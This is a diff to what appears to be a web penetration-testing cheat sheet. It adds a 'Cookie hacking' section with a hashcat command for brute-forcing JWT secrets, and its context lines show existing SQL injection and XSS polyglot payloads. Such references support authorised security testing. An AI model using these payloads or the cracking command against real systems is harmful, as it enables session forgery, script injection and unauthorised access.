@@ -27,7 +27,8 @@
   - [Polyglot payloads](#polyglot-payloads)
      - [XSS polyglot](#xss-polyglot)
      - [SQLi polyglot](#sqli-polyglot)
-     - [JS/URL polyglot](#jsurl-polyglot)  
+     - [JS/URL polyglot](#jsurl-polyglot)
+  - [Cookie hacking](#cookie-hacking)  
   - [Bypass technics](#bypass-technics)
      - [Bypass file upload filtering](#bypass-file-upload-filtering)
      - [Bypass 401/403](#bypass-401403)
@@ -257,6 +258,17 @@ IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(
 ```
 data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
 ```
+
+
+-----------------------------------------------------------------------------------------------------------------
+
+# Cookie hacking
+
+### JWT secret bruteforce
+```
+hashcat -a 0 -m 16500 <YOUR-JWT> /opt/web/wordlist/jwt-secrets.txt
+```
+
 -----------------------------------------------------------------------------------------------------------------
 # Bypass technics
 ### Bypass File Upload Filtering
